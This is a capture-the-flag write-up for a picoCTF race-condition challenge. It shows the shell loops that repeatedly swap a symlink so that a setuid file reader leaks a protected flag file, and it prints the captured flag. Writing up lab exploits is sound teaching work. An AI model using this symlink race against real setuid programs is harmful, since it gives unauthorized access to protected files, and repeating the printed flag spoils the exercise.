# solution of tic tac challenge

1- this challenge is about the race condition vulnerability

2- explanation of the program:

``` text
- we havesetuid program that reads a file only if uid of file owner and  uid of the session are the same {stat.st_uid == getuid()}
```

3- to do this we need to create a soft link between the flag.txt file and a file that we own

- create the file:

```bash
    ctf-player@pico-chall$ echo " public flag " > public.txt
    ctf-player@pico-chall$ ./txtreader public.txt 
    public flag 
```

- we create a soft link to the public file:

```bash
ctf-player@pico-chall$ ln -s public.txt soft
ctf-player@pico-chall$ ./txtreader soft 
 public flag 
```

- now we create an infinite loop of forcing the creation of soft links between the soft file and the flag.txt and the public file:

```bash
ctf-player@pico-chall$ while [ 1 ]; do ln -sf flag.txt soft;ln -sf public.txt soft;done &
[1] 44
```

- now we create an infinite loop to catch the creation of soft links between the soft file and the flag.txt

```bash
ctf-player@pico-chall$ while [ 1 ]; do ./txtreader soft;done 2>/dev/null | grep pico
picoCTF{ToctoU_!s_3a5y_2075872e}
picoCTF{ToctoU_!s_3a5y_2075872e}
picoCTF{ToctoU_!s_3a5y_2075872e}
picoCTF{ToctoU_!s_3a5y_2075872e}
picoCTF{ToctoU_!s_3a5y_2075872e}
picoCTF{ToctoU_!s_3a5y_2075872e}
picoCTF{ToctoU_!s_3a5y_2075872e}
picoCTF{ToctoU_!s_3a5y_2075872e}
picoCTF{ToctoU_!s_3a5y_2075872e}
picoCTF{ToctoU_!s_3a5y_2075872e}
picoCTF{ToctoU_!s_3a5y_2075872e}
```
